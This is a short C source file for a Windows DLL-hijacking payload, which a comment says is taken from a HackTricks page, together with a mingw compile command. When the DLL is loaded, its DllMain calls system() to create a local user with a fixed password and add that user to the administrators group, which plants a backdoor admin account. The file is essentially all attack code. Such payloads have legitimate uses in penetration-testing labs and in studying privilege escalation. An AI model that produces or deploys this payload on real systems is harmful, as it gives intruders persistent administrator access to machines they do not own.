// stolen from https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dll-hijacking#your-own
// compile: x86_64-w64-mingw32-gcc add_user_1.c -shared -o add_user.dll
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("cmd /c net user iamf P@ssw0rd /add; cmd /c net localgroup administrators iamf /add");
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
